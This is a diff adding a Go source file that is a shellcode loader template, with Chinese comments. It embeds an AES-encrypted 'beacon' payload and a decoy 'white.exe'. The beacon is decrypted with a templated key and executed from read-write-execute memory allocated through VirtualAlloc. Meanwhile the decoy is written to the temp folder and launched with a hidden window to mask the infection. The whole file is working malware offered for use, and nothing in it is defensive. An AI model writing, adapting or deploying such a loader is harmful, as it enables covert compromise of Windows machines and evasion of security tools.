@@ -1,0 +1,99 @@
+package main
+
+import (
+	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	_ "embed"
+	"io/ioutil"
+	"os"
+	"os/exec"
+	"path"
+	"sync"
+	"syscall"
+	"unsafe"
+)
+
+//go:embed static/tmp.bin
+var beacon []byte
+
+//go:embed static/white.exe
+var whiteFile string
+
+func execCmd(command string) {
+	// cmd := exec.Command("cmd.exe", "/c", "start", command)
+	cmd := exec.Command("cmd.exe", "/c", "start", command)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Start()
+}
+
+// shellcode
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+	KEY_1                  = 55
+	KEY_2                  = 66
+)
+
+var (
+	kernel32      = syscall.MustLoadDLL("kernel32.dll")
+	ntdll         = syscall.MustLoadDLL("ntdll.dll")
+	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
+	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
+)
+
+func Run(shellcodeBeacon []byte) {
+	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcodeBeacon)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) // 为shellcode申请内存空间
+	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcodeBeacon[0])), uintptr(len(shellcodeBeacon))) // 将shellcode内存复制到申请出来的内存空间中
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+
+func PKCS7Padding(ciphertext []byte, blockSize int) []byte {
+	padding := blockSize - len(ciphertext)%blockSize
+	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
+	return append(ciphertext, padtext...)
+}
+
+func PKCS7UnPadding(origData []byte) []byte {
+	length := len(origData)
+	unpadding := int(origData[length-1])
+	return origData[:(length - unpadding)]
+}
+
+//AES解密
+func AesDecrypt(crypted, key []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	blockSize := block.BlockSize()
+	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])
+	origData := make([]byte, len(crypted))
+	blockMode.CryptBlocks(origData, crypted)
+	origData = PKCS7UnPadding(origData)
+	return origData, nil
+}
+
+func shellcoeRun(encrypteds []byte, aesKey string) {
+	origin, _ := AesDecrypt(encrypteds, []byte(aesKey))
+	Run([]byte(origin))
+}
+
+func main() {
+	var wg = sync.WaitGroup{}
+	wg.Add(2)
+	go func() {
+		// shellcode
+		defer wg.Done()
+		key := "{{.AesKey}}"
+		shellcoeRun(beacon, key)
+	}()
+	go func() {
+		defer wg.Done()
+		whitePath := path.Join(os.TempDir(), "white.exe")
+		ioutil.WriteFile(whitePath, []byte(whiteFile), 0666)
+		execCmd(whitePath)
+	}()
+	wg.Wait()
+}
